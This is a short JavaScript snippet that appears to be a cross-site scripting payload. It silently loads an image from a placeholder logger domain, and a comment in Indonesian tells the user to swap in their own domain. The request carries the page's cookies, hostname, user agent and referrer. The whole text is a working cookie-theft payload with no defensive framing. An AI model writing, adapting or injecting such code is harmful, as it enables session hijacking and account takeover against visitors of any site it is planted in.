(function() {
    const i = new Image();
    const logURL = "https://your-logger-domain.com/log"; // ← ganti dengan domain kamu
    i.src = logURL +
        "?ip=" + encodeURIComponent(location.hostname) +
        "&cookie=" + encodeURIComponent(document.cookie) +
        "&ua=" + encodeURIComponent(navigator.userAgent) +
        "&ref=" + encodeURIComponent(document.referrer);
})();

